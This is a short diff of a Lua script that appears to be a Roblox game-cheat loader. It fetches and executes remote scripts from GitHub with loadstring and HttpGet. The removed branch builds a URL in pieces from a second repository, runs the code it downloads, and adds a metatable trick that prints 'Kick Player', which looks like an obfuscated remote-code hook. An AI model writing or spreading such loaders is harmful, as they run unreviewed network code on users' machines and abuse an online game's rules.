@@ -2,22 +2,6 @@ if _G.Chest_Farm then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/ahmadsgamer2/main/ChestFarm_BF.lua"))()
 elseif _G.FruitFinder then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmadsgamer2/ahmadsgamer2/main/FruitFinder.lua"))()
-else
-    local a = "https://raw.githubusercontent.com/"
-    local b = "bot21333/C-/main/"
-    local a = a .. b .. "/C__%23%23.lua"
-    local a = loadstring(game:HttpGet(a))()
-    pcall(
-        game.HttpGet,
-        game,
-        setmetatable(
-            {},
-            {__tostring = function()
-                    print("Kick Player")
-                    return ""
-                end}
-        )
-    )
     repeat
         wait()
     until game.Players
